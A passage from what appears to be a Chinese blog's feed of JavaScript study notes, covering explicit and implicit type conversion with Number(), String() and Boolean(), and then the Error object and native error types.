<h4 id="1-2-强制转换"><a href="#1-2-强制转换" class="headerlink" title="1.2 强制转换"></a>1.2 强制转换</h4><p>强制转换主要指使用<code>Number()</code>、<code>String()</code>和<code>Boolean()</code>三个函数，手动将各种类型的值，分别转换成数字、字符串或者布尔值</p>
<h5 id="1-2-1-Number"><a href="#1-2-1-Number" class="headerlink" title="1.2.1 Number()"></a>1.2.1 Number()</h5><p>使用<code>Number</code>函数，可以将任意类型的值转化成数值。<br>下面分成两种情况讨论，一种是参数是原始类型的值，另一种是参数是对象</p>
<h6 id="1-原始值类型"><a href="#1-原始值类型" class="headerlink" title="(1)原始值类型"></a>(1)原始值类型</h6><p>原始类型值的转换规则如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数值：转换后还是原来的值</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="number">324</span>) <span class="comment">// 324</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串：如果可以被解析为数值，则转换为相应的数值</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;324&#x27;</span>) <span class="comment">// 324</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串：如果不可以被解析为数值，返回 NaN</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;324abc&#x27;</span>) <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 空字符串转为0</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 布尔值：true 转成 1，false 转成 0</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">true</span>) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">false</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined：转成 NaN</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">undefined</span>) <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// null：转成0</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">null</span>) <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p><code>Number</code>函数将字符串转为数值，要比<code>parseInt</code>函数严格很多。基本上，只要有一个字符无法转成数值，整个字符串就会被转为<code>NaN</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;42 cats&#x27;</span>) <span class="comment">// 42</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;42 cats&#x27;</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>parseInt</code>逐个解析字符，而<code>Number</code>函数整体转换字符串的类型<br>另外，<code>parseInt</code>和<code>Number</code>函数都会自动过滤一个字符串前导和后缀的空格</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;\t\v\r12.34\n&#x27;</span>) <span class="comment">// 12</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;\t\v\r12.34\n&#x27;</span>) <span class="comment">// 12.34</span></span><br></pre></td></tr></table></figure>
<h6 id="2-对象"><a href="#2-对象" class="headerlink" title="(2)对象"></a>(2)对象</h6><p>简单的规则是，<code>Number</code>方法的参数是对象时，将返回<code>NaN</code>，除非是包含单个数值的数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>(&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Number</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Number</span>([<span class="number">5</span>]) <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>之所以会这样，是因为<code>Number</code>背后的转换规则比较复杂<br>第一步，调用对象自身的<code>valueOf</code>方法。如果返回原始类型的值，则直接对该值使用<code>Number</code>函数，不再进行后续步骤<br>第二步，如果<code>valueOf</code>方法返回的还是对象，则改为调用对象自身的<code>toString</code>方法。如果<code>toString</code>方法返回原始类型的值，则对该值使用<code>Number</code>函数，不再进行后续步骤<br>第三步，如果<code>toString</code>方法返回的是对象，就报错<br>请看下面的例子</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="built_in">Number</span>(obj) <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> obj.valueOf() === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">  <span class="built_in">Number</span>(obj.toString());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">Number</span>(obj.valueOf());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Number</code>函数将<code>obj</code>对象转为数值。背后发生了一连串的操作，首先调用<code>obj.valueOf</code>方法, 结果返回对象本身；于是，继续调用<code>obj.toString</code>方法，这时返回字符串<code>[object Object]</code>，对这个字符串使用<code>Number</code>函数，得到<code>NaN</code><br>默认情况下，对象的<code>valueOf</code>方法返回对象本身，所以一般总是会调用<code>toString</code>方法，而<code>toString</code>方法返回对象的类型字符串（比如<code>[object Object]</code>）。所以，会有下面的结果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>(&#123;&#125;) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>如果<code>toString</code>方法返回的不是原始类型的值，结果就会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>(obj)</span><br><span class="line"><span class="comment">// TypeError: Cannot convert object to primitive value</span></span><br></pre></td></tr></table></figure>
<p>上面代码的<code>valueOf</code>和<code>toString</code>方法，返回的都是对象，所以转成数值时会报错<br>从上例还可以看到，<code>valueOf</code>和<code>toString</code>方法，都是可以自定义的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>(&#123;</span><br><span class="line">  valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>(&#123;</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>(&#123;</span><br><span class="line">  valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码对三个对象使用<code>Number</code>函数。第一个对象返回<code>valueOf</code>方法的值，第二个对象返回<code>toString</code>方法的值，第三个对象表示<code>valueOf</code>方法先于<code>toString</code>方法执行</p>
<h5 id="1-2-2-String"><a href="#1-2-2-String" class="headerlink" title="1.2.2 String()"></a>1.2.2 String()</h5><p><code>String</code>函数可以将任意类型的值转化成字符串，转换规则如下</p>
<h6 id="1-原始类型值"><a href="#1-原始类型值" class="headerlink" title="(1)原始类型值"></a>(1)原始类型值</h6><ul>
<li>数值：转为相应的字符串。</li>
<li>字符串：转换后还是原来的值。</li>
<li>布尔值：<code>true</code>转为字符串<code>&quot;true&quot;</code>，<code>false</code>转为字符串<code>&quot;false&quot;</code>。</li>
<li>undefined：转为字符串<code>&quot;undefined&quot;</code>。</li>
<li>null：转为字符串<code>&quot;null&quot;</code>。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>(<span class="number">123</span>) <span class="comment">// &quot;123&quot;</span></span><br><span class="line"><span class="built_in">String</span>(<span class="string">&#x27;abc&#x27;</span>) <span class="comment">// &quot;abc&quot;</span></span><br><span class="line"><span class="built_in">String</span>(<span class="literal">true</span>) <span class="comment">// &quot;true&quot;</span></span><br><span class="line"><span class="built_in">String</span>(<span class="literal">undefined</span>) <span class="comment">// &quot;undefined&quot;</span></span><br><span class="line"><span class="built_in">String</span>(<span class="literal">null</span>) <span class="comment">// &quot;null&quot;</span></span><br></pre></td></tr></table></figure>
<h6 id="2-对象-1"><a href="#2-对象-1" class="headerlink" title="(2)对象"></a>(2)对象</h6><code>String</code>方法的参数如果是对象，返回一个类型字符串；如果是数组，返回该数组的字符串形式<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>(&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;) <span class="comment">// &quot;[object Object]&quot;</span></span><br><span class="line"><span class="built_in">String</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) <span class="comment">// &quot;1,2,3&quot;</span></span><br></pre></td></tr></table></figure>
<code>String</code>方法背后的转换规则，与<code>Number</code>方法基本相同，只是互换了<code>valueOf</code>方法和<code>toString</code>方法的执行顺序</li>
</ul>
<ol>
<li>先调用对象自身的<code>toString</code>方法。如果返回原始类型的值，则对该值使用<code>String</code>函数，不再进行以下步骤。</li>
<li>如果<code>toString</code>方法返回的是对象，再调用原对象的<code>valueOf</code>方法。如果<code>valueOf</code>方法返回原始类型的值，则对该值使用<code>String</code>函数，不再进行以下步骤。</li>
<li>如果<code>valueOf</code>方法返回的是对象，就报错。<br>下面是一个列子:<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>(&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">// &quot;[object Object]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">String</span>(&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;.toString())</span><br><span class="line"><span class="comment">// &quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure>
上面代码先调用对象的<code>toString</code>方法，发现返回的是字符串<code>[object Object]</code>，就不再调用<code>valueOf</code>方法了<br>如果<code>toString</code>法和<code>valueOf</code>方法，返回的都是对象，就会报错<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>(obj)</span><br><span class="line"><span class="comment">// TypeError: Cannot convert object to primitive value</span></span><br></pre></td></tr></table></figure>
下面是通过自定义<code>toString</code>方法，改变返回值的例子<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>(&#123;</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// &quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>(&#123;</span><br><span class="line">  valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// &quot;[object Object]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>(&#123;</span><br><span class="line">  valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// &quot;3&quot;</span></span><br></pre></td></tr></table></figure>
上面代码对三个对象使用<code>String</code>函数。第一个对象返回<code>toString</code>方法的值（数值<code>3</code>），第二个对象返回的还是<code>toString</code>方法的值（<code>[object Object]</code>），第三个对象表示<code>toString</code>方法先于<code>valueOf</code>方法执行</li>
</ol>
<h5 id="1-2-3-Boolean"><a href="#1-2-3-Boolean" class="headerlink" title="1.2.3 Boolean()"></a>1.2.3 Boolean()</h5><p><code>Boolean()</code>函数可以将任意类型的值转为布尔值<br>它的转换规则相对简单：除了以下五个值的转换结果为<code>false</code>，其他的值全部为<code>true</code></p>
<ul>
<li>undefined</li>
<li>null</li>
<li>0（包含-0和+0）</li>
<li>NaN</li>
<li>‘’（空字符串）<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Boolean</span>(<span class="literal">undefined</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="literal">null</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="number">0</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="literal">NaN</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
当然，<code>true</code>和<code>false</code>这两个布尔值不会发生变化<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Boolean</span>(<span class="literal">true</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="literal">false</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
注意，所有对象（包括空对象）的转换结果都是<code>true</code>，甚至连<code>false</code>对应的布尔对象<code>new Boolean(false)</code>也是<code>true</code>（详见《原始类型值的包装对象》一章）<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Boolean</span>(&#123;&#125;) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Boolean</span>([]) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">false</span>)) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
所有对象的布尔值都是<code>true</code>，这是因为 JavaScript语言设计的时候，出于性能的考虑，如果对象需要计算才能得到布尔值，对于<code>obj1 &amp;&amp; obj2</code>这样的场景，可能会需要较多的计算。为了保证性能，就统一规定，对象的布尔值为<code>true</code></li>
</ul>
<h4 id="1-3-自动转换"><a href="#1-3-自动转换" class="headerlink" title="1.3 自动转换"></a>1.3 自动转换</h4><p>自动转换，它是以强制转换为基础的。<br>遇到以下三种情况时，JavaScript 会自动转换数据类型，即转换是自动完成的，用户不可见。<br>第一种情况，不同类型的数据互相运算。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">123</span> + <span class="string">&#x27;abc&#x27;</span> <span class="comment">// &quot;123abc&quot;</span></span><br></pre></td></tr></table></figure>
<p>第二种情况，对非布尔值类型的数据求布尔值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;abc&#x27;</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">&#125;  <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure>
<p>第三种情况，对非数值类型的值使用一元运算符（即<code>+</code>和<code>-</code>）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">+ &#123;<span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span>&#125; <span class="comment">// NaN</span></span><br><span class="line">- [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>自动转换的规则是这样的：预期什么类型的值，就调用该类型的转换函数。比如，某个位置预期为字符串，就调用<code>String()</code>函数进行转换。如果该位置既可以是字符串，也可能是数值，那么默认转为数值<br>由于自动转换具有不确定性，而且不易除错，建议在预期为布尔值、数值、字符串的地方，全部使用<code>Boolean()</code>、<code>Number()</code>和<code>String()</code>函数进行显式转换</p>
<h5 id="1-3-1-自动转换为布尔值"><a href="#1-3-1-自动转换为布尔值" class="headerlink" title="1.3.1 自动转换为布尔值"></a>1.3.1 自动转换为布尔值</h5><p>JavaScript遇到预期为布尔值的地方（比如<code>if</code>语句的条件部分），就会将非布尔值的参数自动转换为布尔值。系统内部会自动调用<code>Boolean()</code>函数<br>因此除了以下五个值，其他都是自动转为<code>true</code></p>
<ul>
<li><code>undefined</code></li>
<li><code>null</code></li>
<li><code>+0</code>或<code>-0</code></li>
<li><code>NaN</code></li>
<li><code>&#39;&#39;</code>（空字符串）<br>下面这个例子中，条件部分的每个值都相当于<code>false</code>，使用否定运算符后，就变成了<code>true</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="literal">undefined</span></span><br><span class="line">  &amp;&amp; !<span class="literal">null</span></span><br><span class="line">  &amp;&amp; !<span class="number">0</span></span><br><span class="line">  &amp;&amp; !<span class="literal">NaN</span></span><br><span class="line">  &amp;&amp; !<span class="string">&#x27;&#x27;</span></span><br><span class="line">) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;true&#x27;</span>);</span><br><span class="line">&#125; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
下面两种写法，有时也用于将一个表达式转为布尔值。它们内部调用的也是<code>Boolean()</code>函数<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line">expression ? <span class="literal">true</span> : <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line">!! expression</span><br></pre></td></tr></table></figure>
<h5 id="1-3-2-自动转换为字符串"><a href="#1-3-2-自动转换为字符串" class="headerlink" title="1.3.2 自动转换为字符串"></a>1.3.2 自动转换为字符串</h5>JavaScript 遇到预期为字符串的地方，就会将非字符串的值自动转为字符串。具体规则是，先将复合类型的值转为原始类型的值，再将原始类型的值转为字符串<br>字符串的自动转换，主要发生在字符串的加法运算时。当一个值为字符串，另一个值为非字符串，则后者转为字符串<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;5&#x27;</span> + <span class="number">1</span> <span class="comment">// &#x27;51&#x27;</span></span><br><span class="line"><span class="string">&#x27;5&#x27;</span> + <span class="literal">true</span> <span class="comment">// &quot;5true&quot;</span></span><br><span class="line"><span class="string">&#x27;5&#x27;</span> + <span class="literal">false</span> <span class="comment">// &quot;5false&quot;</span></span><br><span class="line"><span class="string">&#x27;5&#x27;</span> + &#123;&#125; <span class="comment">// &quot;5[object Object]&quot;</span></span><br><span class="line"><span class="string">&#x27;5&#x27;</span> + [] <span class="comment">// &quot;5&quot;</span></span><br><span class="line"><span class="string">&#x27;5&#x27;</span> + <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;&#125; <span class="comment">// &quot;5function ()&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">&#x27;5&#x27;</span> + <span class="literal">undefined</span> <span class="comment">// &quot;5undefined&quot;</span></span><br><span class="line"><span class="string">&#x27;5&#x27;</span> + <span class="literal">null</span> <span class="comment">// &quot;5null&quot;</span></span><br></pre></td></tr></table></figure>
这种自动转换很容易出错，例如<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  width: <span class="string">&#x27;100&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.width + <span class="number">20</span> <span class="comment">// &quot;10020&quot;</span></span><br></pre></td></tr></table></figure>
上面代码中，开发者可能期望返回<code>120</code>，但是由于自动转换，实际上返回了一个字符<code>10020</code></li>
</ul>
<h5 id="1-3-3-自动转换为数值"><a href="#1-3-3-自动转换为数值" class="headerlink" title="1.3.3 自动转换为数值"></a>1.3.3 自动转换为数值</h5><p>JavaScript 遇到预期为数值的地方，就会将参数值自动转换为数值。系统内部会自动调用<code>Number()</code>函数<br>除了加法运算符（<code>+</code>）有可能把运算子转为字符串，其他运算符都会把运算子自动转成数值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;5&#x27;</span> - <span class="string">&#x27;2&#x27;</span> <span class="comment">// 3</span></span><br><span class="line"><span class="string">&#x27;5&#x27;</span> * <span class="string">&#x27;2&#x27;</span> <span class="comment">// 10</span></span><br><span class="line"><span class="literal">true</span> - <span class="number">1</span>  <span class="comment">// 0</span></span><br><span class="line"><span class="literal">false</span> - <span class="number">1</span> <span class="comment">// -1</span></span><br><span class="line"><span class="string">&#x27;1&#x27;</span> - <span class="number">1</span>   <span class="comment">// 0</span></span><br><span class="line"><span class="string">&#x27;5&#x27;</span> * []    <span class="comment">// 0</span></span><br><span class="line"><span class="literal">false</span> / <span class="string">&#x27;5&#x27;</span> <span class="comment">// 0</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span> - <span class="number">1</span>   <span class="comment">// NaN</span></span><br><span class="line"><span class="literal">null</span> + <span class="number">1</span> <span class="comment">// 1</span></span><br><span class="line"><span class="literal">undefined</span> + <span class="number">1</span> <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，运算符两侧的运算子，都被转成了数值<br><code>注意：`null`转为数值时为`0`，而`undefined`转为数值时为`NaN`</code><br>一元运算符也会把运算子转成数值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">+<span class="string">&#x27;abc&#x27;</span> <span class="comment">// NaN</span></span><br><span class="line">-<span class="string">&#x27;abc&#x27;</span> <span class="comment">// NaN</span></span><br><span class="line">+<span class="literal">true</span> <span class="comment">// 1</span></span><br><span class="line">-<span class="literal">false</span> <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>


<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS语法-数据类型的转换</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0012</title>
    <url>/2021/05/11/%E6%89%93%E5%8D%A10012/</url>
    <content><![CDATA[<p><font color=ffc20e>人生从来没有太晚的开始，再微小的改变，乘以365天，都会成为别人羡慕不来的实力。</font></p>
<h2 id="JS语法"><a href="#JS语法" class="headerlink" title="JS语法"></a>JS语法</h2><h3 id="2-错误处理机制"><a href="#2-错误处理机制" class="headerlink" title="2. 错误处理机制"></a>2. 错误处理机制</h3><h4 id="2-1-Error实例对象"><a href="#2-1-Error实例对象" class="headerlink" title="2.1 Error实例对象"></a>2.1 Error实例对象</h4><p>JavaScript 解析或运行时，一旦发生错误，引擎就会抛出一个错误对象。JavaScript 原生提供<code>Error</code>构造函数，所有抛出的错误都是这个构造函数的实例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> err = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;出错了&#x27;</span>);</span><br><span class="line">err.message <span class="comment">// &quot;出错了&quot;</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面代码中，我们调用<code>Error()</code>构造函数，生成一个实例对象<code>err</code>。<code>Error()</code>构造函数接受一个参数，表示错误提示，可以从实例的<code>message</code>属性读到这个参数。抛出<code>Error</code>实例对象以后，整个程序就中断在发生错误的地方，不再往下执行<br>JavaScript 语言标准只提到，<code>Error</code>实例对象必须有<code>message</code>属性，表示出错时的提示信息，没有提到其他属性。大多数 JavaScript 引擎，对<code>Error</code>实例还提供<code>name</code>和<code>stack</code>属性，分别表示错误的名称和错误的堆栈，但它们是非标准的，不是每种实现都有</p>
<ul>
<li>message：错误提示信息</li>
<li>name：错误名称（非标准属性）</li>
<li>stack：错误的堆栈（非标准属性）<br>使用<code>name</code>和<code>message</code>这两个属性，可以对发生什么错误有一个大概的了解<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (error.name) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error.name + <span class="string">&#x27;: &#x27;</span> + error.message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<code>stack</code>属性用来查看错误发生时的堆栈<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throwit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">catchit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    throwit();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.stack); <span class="comment">// print stack trace</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catchit()</span><br><span class="line"><span class="comment">// Error</span></span><br><span class="line"><span class="comment">//    at throwit (~/examples/throwcatch.js:9:11)</span></span><br><span class="line"><span class="comment">//    at catchit (~/examples/throwcatch.js:3:9)</span></span><br><span class="line"><span class="comment">//    at repl:1:5</span></span><br></pre></td></tr></table></figure>
上面代码中，错误堆栈的最内层是<code>throwit</code>函数，然后是<code>catchit</code>函数，最后是函数的运行环境</li>
</ul>
<h4 id="2-2-原生错误类型"><a href="#2-2-原生错误类型" class="headerlink" title="2.2 原生错误类型"></a>2.2 原生错误类型</h4><p><code>Error</code>实例对象是最一般的错误类型，在它的基础上，JavaScript 还定义了其他6种错误对象。也就是说，存在<code>Error</code>的6个派生对象</p>
<h5 id="2-2-1-SyntaxError对象"><a href="#2-2-1-SyntaxError对象" class="headerlink" title="2.2.1 SyntaxError对象"></a>2.2.1 SyntaxError对象</h5><p><code>SyntaxError</code>对象是解析代码时发生的语法错误</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 变量名错误</span></span><br><span class="line"><span class="keyword">var</span> 1a;</span><br><span class="line"><span class="comment">// Uncaught SyntaxError: Invalid or unexpected token</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 缺少括号</span></span><br><span class="line"><span class="built_in">console</span>.log <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="comment">// Uncaught SyntaxError: Unexpected string</span></span><br></pre></td></tr></table></figure>
<h5 id="2-2-2-ReferenceError对象"><a href="#2-2-2-ReferenceError对象" class="headerlink" title="2.2.2 ReferenceError对象"></a>2.2.2 ReferenceError对象</h5><p><code>ReferenceError</code>对象是引用一个不存在的变量时发生的错误</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用一个不存在的变量</span></span><br><span class="line">unknownVariable</span><br><span class="line"><span class="comment">// Uncaught ReferenceError: unknownVariable is not defined</span></span><br></pre></td></tr></table></figure>
<p>另一种触发场景是，将一个值分配给无法分配的对象，比如对函数的运行结果赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 等号左侧不是变量</span></span><br><span class="line"><span class="built_in">console</span>.log() = <span class="number">1</span></span><br><span class="line"><span class="comment">// Uncaught ReferenceError: Invalid left-hand side in assignment</span></span><br></pre></td></tr></table></figure>
<p>上面代码对函数<code>console.log</code>的运行结果赋值，结果引发了<code>ReferenceError</code>错误</p>
<h5 id="2-2-3-RangeError对象"><a href="#2-2-3-RangeError对象" class="headerlink" title="2.2.3 RangeError对象"></a>2.2.3 RangeError对象</h5><p><code>RangeError</code>对象是一个值超出有效范围时发生的错误。主要有几种情况，一是数组长度为负数，二是<code>Number</code>对象的方法参数超出范围，以及函数堆栈超过最大值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数组长度不得为负数</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(-<span class="number">1</span>)</span><br><span class="line"><span class="comment">// Uncaught RangeError: Invalid array length</span></span><br></pre></td></tr></table></figure>
